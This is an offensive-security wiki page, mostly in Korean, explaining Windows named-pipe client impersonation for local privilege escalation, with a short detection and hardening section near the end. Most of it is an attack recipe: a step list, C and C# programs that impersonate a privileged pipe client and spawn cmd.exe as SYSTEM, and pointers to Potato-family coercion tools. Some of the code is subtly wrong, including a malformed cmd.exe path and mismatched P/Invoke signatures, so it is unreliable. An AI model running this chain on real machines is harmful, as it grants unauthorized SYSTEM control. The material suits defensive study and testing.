# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation은 로컬 권한 상승 프리미티브로, named-pipe 서버 스레드가 연결된 클라이언트의 보안 컨텍스트를 채택할 수 있게 합니다. 실제로 SeImpersonatePrivilege로 코드를 실행할 수 있는 공격자는 권한 있는 클라이언트(예: SYSTEM 서비스)를 공격자가 제어하는 파이프에 연결하도록 유도하고, ImpersonateNamedPipeClient를 호출한 다음 결과 토큰을 primary 토큰으로 복제하여 클라이언트(종종 NT AUTHORITY\SYSTEM)로서 프로세스를 생성할 수 있습니다.

이 페이지는 핵심 기법에 초점을 맞춥니다. SYSTEM을 귀하의 파이프에 강제로 연결시키는 end-to-end exploit chains에 대해서는 아래에 참조된 Potato 계열 페이지를 보세요.

## TL;DR
- Create a named pipe: \\.\pipe\<random> and wait for a connection.
- Make a privileged component connect to it (spooler/DCOM/EFSRPC/etc.).
- Read at least one message from the pipe, then call ImpersonateNamedPipeClient.
- Open the impersonation token from the current thread, DuplicateTokenEx(TokenPrimary), and CreateProcessWithTokenW/CreateProcessAsUser to get a SYSTEM process.

## 요구사항 및 주요 API
- 호출 프로세스/스레드에서 일반적으로 필요한 권한:
- SeImpersonatePrivilege — 연결된 클라이언트를 성공적으로 impersonate하고 CreateProcessWithTokenW를 사용하기 위해 필요합니다.
- 또는 SYSTEM을 impersonate한 후 CreateProcessAsUser를 사용할 수 있으며, 이 경우 SeAssignPrimaryTokenPrivilege 및 SeIncreaseQuotaPrivilege가 필요할 수 있습니다(이 권한들은 SYSTEM을 impersonate하고 있으면 충족됩니다).
- 사용되는 핵심 API:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (임시 대리 이전에 최소 하나의 메시지를 읽어야 합니다)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: 로컬에서 유용한 작업을 수행하려면 클라이언트가 SecurityImpersonation을 허용해야 합니다(여러 로컬 RPC/명명된 파이프 클라이언트의 기본값). 클라이언트는 파이프를 열 때 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION으로 이를 낮출 수 있습니다.

## 최소 Win32 워크플로우 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
참고:
- ImpersonateNamedPipeClient가 ERROR_CANNOT_IMPERSONATE (1368)을 반환하면 먼저 파이프에서 읽었는지 확인하고 클라이언트가 impersonation을 Identification level로 제한하지 않았는지 확인하세요.
- 프로세스 생성에 적합한 primary token을 만들려면 DuplicateTokenEx를 SecurityImpersonation 및 TokenPrimary로 사용하는 것이 권장됩니다.

## .NET 간단한 예제
In .NET, NamedPipeServerStream can impersonate via RunAsClient. Once impersonating, duplicate the thread token and create a process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
이 기술들은 권한이 높은 서비스들을 강제로 당신의 named pipe에 연결하게 하여 그들을 impersonate할 수 있게 합니다:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

See detailed usage and compatibility here:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

If you just need a full example of crafting the pipe and impersonating to spawn SYSTEM from a service trigger, see:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Troubleshooting and gotchas
- ImpersonateNamedPipeClient를 호출하기 전에 파이프에서 최소한 한 개의 메시지를 읽어야 합니다. 그렇지 않으면 ERROR_CANNOT_IMPERSONATE (1368)가 발생합니다.
- 클라이언트가 SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION로 연결되면 서버는 완전한 impersonation을 할 수 없습니다; GetTokenInformation(TokenImpersonationLevel)을 통해 토큰의 impersonation 레벨을 확인하세요.
- CreateProcessWithTokenW는 호출자에게 SeImpersonatePrivilege가 필요합니다. 이것이 ERROR_PRIVILEGE_NOT_HELD (1314)로 실패하면, 이미 SYSTEM을 impersonate한 후 CreateProcessAsUser를 사용하세요.
- 파이프의 보안 기술자를 강화한 경우 대상 서비스가 연결할 수 있도록 설정되어 있는지 확인하세요; 기본적으로 \\.\pipe 아래의 파이프들은 서버의 DACL에 따라 접근 가능합니다.

## Detection and hardening
- named pipe 생성 및 연결을 모니터링하세요. Sysmon Event IDs 17 (Pipe Created) 및 18 (Pipe Connected)은 정상적인 파이프 이름을 기준선으로 삼고, 토큰 조작 이벤트에 앞서 나타나는 비정상적이거나 무작위처럼 보이는 파이프를 탐지하는 데 유용합니다.
- 다음과 같은 시퀀스를 찾아보세요: 프로세스가 파이프를 생성하고, SYSTEM 서비스가 연결한 뒤, 생성한 프로세스가 SYSTEM으로 자식 프로세스를 생성합니다.
- 불필요한 서비스 계정에서 SeImpersonatePrivilege를 제거하고, 고권한으로 불필요한 서비스 로그온을 피하여 노출을 줄이세요.
- 방어적 개발: 신뢰할 수 없는 named pipe에 연결할 때는 서버가 불필요하게 클라이언트를 완전하게 impersonate하지 못하도록 SECURITY_SQOS_PRESENT와 SECURITY_IDENTIFICATION을 지정하세요.

## References
- Windows: ImpersonateNamedPipeClient documentation (impersonation requirements and behavior). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (walkthrough and code examples). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
